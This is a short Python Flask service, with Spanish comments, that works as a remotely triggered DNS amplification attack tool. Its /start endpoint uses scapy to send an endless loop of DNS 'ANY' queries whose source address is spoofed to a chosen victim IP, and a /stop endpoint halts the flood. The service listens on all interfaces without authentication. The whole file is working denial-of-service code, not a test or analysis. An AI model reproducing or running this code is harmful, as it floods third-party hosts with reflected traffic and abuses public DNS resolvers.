from flask import Flask
from scapy.all import *
import threading
import sys, time

stop_flag = False  # Variable de bandera para controlar el bucle
app = Flask(__name__)
@app.route("/start/<ip1>/<ip2>")
def start(ip1, ip2):
    global stop_flag  # Accede a la variable de bandera global
    stop_flag = False  # Establece la variable de bandera en false para activar el bucle
    # Crea una dns request usando scapy
    dns_request = IP(src=ip1, dst=ip2) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='hola.com', qtype='ANY'))
    while not stop_flag:
        send(dns_request)
    return 'packet sent'
@app.route("/stop")
def stop():
    global stop_flag  # Accede a la variable de bandera global
    stop_flag = True  # Establece la variable de bandera en True para detener el bucle
    return "stopped"


if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5200)






